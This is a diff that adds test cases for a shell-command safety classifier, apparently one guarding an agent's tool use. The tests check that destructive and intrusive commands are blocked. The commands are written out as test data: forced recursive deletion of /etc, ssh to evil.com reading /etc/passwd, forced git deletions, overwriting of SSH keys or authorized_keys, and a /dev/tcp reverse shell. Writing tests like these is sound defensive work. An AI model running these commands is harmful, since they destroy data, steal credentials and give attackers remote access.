@@ -475,6 +475,107 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("rm split-flag forms (adversarial)", () => {
+    test("rm -r -f /etc (split short flags)", () => {
+      expect(classifyCommand("rm -r -f /etc").ok).toBe(false);
+    });
+
+    test("rm -f -r /etc (reversed split)", () => {
+      expect(classifyCommand("rm -f -r /etc").ok).toBe(false);
+    });
+
+    test("rm --recursive -f /etc", () => {
+      expect(classifyCommand("rm --recursive -f /etc").ok).toBe(false);
+    });
+
+    test("rm -r --force /etc", () => {
+      expect(classifyCommand("rm -r --force /etc").ok).toBe(false);
+    });
+
+    test("rm -R -f /System (capital R split)", () => {
+      expect(classifyCommand("rm -R -f /System").ok).toBe(false);
+    });
+
+    test("rm -f file.txt (no -r flag → allowed)", () => {
+      expect(classifyCommand("rm -f file.txt").ok).toBe(true);
+    });
+
+    test("rm -r /tmp/x (no -f flag → allowed, /tmp not system)", () => {
+      expect(classifyCommand("rm -r /tmp/x").ok).toBe(true);
+    });
+  });
+
+  describe("path-invoked ssh (exec path, not .ssh/ directory)", () => {
+    test("/usr/bin/ssh user@host blocks", () => {
+      expect(classifyCommand("/usr/bin/ssh user@evil.com 'cat /etc/passwd'").ok).toBe(false);
+    });
+
+    test("./ssh user@host blocks", () => {
+      expect(classifyCommand("./ssh user@evil.com").ok).toBe(false);
+    });
+
+    test(".ssh/config path reference does NOT trip ssh regex (false-positive guard)", () => {
+      expect(classifyCommand("cat ~/.ssh/config").ok).toBe(true);
+    });
+  });
+
+  describe("git destructive long-form equivalents", () => {
+    test("git clean --force blocks", () => {
+      expect(classifyCommand("git clean --force -d").ok).toBe(false);
+    });
+
+    test("git branch --delete --force blocks", () => {
+      expect(classifyCommand("git branch --delete --force feature").ok).toBe(false);
+    });
+
+    test("git branch --force --delete blocks (reversed)", () => {
+      expect(classifyCommand("git branch --force --delete feature").ok).toBe(false);
+    });
+
+    test("git checkout --force blocks", () => {
+      expect(classifyCommand("git checkout --force main").ok).toBe(false);
+    });
+
+    test("git branch --delete feature (no --force → allowed)", () => {
+      // Safe: non-force branch delete still requires unmerged check from git.
+      expect(classifyCommand("git branch --delete old").ok).toBe(true);
+    });
+  });
+
+  describe("SSH_DIR_WRITE redirect variants", () => {
+    test("exec 3> $HOME/.ssh/id_rsa (fd-prefixed redirect)", () => {
+      expect(classifyCommand("exec 3> $HOME/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test('exec 3> "$HOME/.ssh/id_rsa" (quoted target)', () => {
+      expect(classifyCommand('exec 3> "$HOME/.ssh/id_rsa"').ok).toBe(false);
+    });
+
+    test("exec 3>|$HOME/.ssh/id_rsa (noclobber override)", () => {
+      expect(classifyCommand("exec 3>|$HOME/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test("&>~/.ssh/authorized_keys (combined redirect)", () => {
+      expect(classifyCommand("cmd &>~/.ssh/authorized_keys").ok).toBe(false);
+    });
+
+    test(">>~/.ssh/authorized_keys (append redirect)", () => {
+      expect(classifyCommand('echo "key" >> ~/.ssh/authorized_keys').ok).toBe(false);
+    });
+  });
+
+  describe("ReDoS / input-length guard", () => {
+    test("extremely long repeated-keyword input is rejected linearly", () => {
+      const input = `git ${"reset ".repeat(20000)}--hard`;
+      const t = performance.now();
+      const result = classifyCommand(input);
+      const dt = performance.now() - t;
+      expect(result.ok).toBe(false);
+      // Must complete in well under a second even for 100k+ char adversarial input.
+      expect(dt).toBeLessThan(500);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
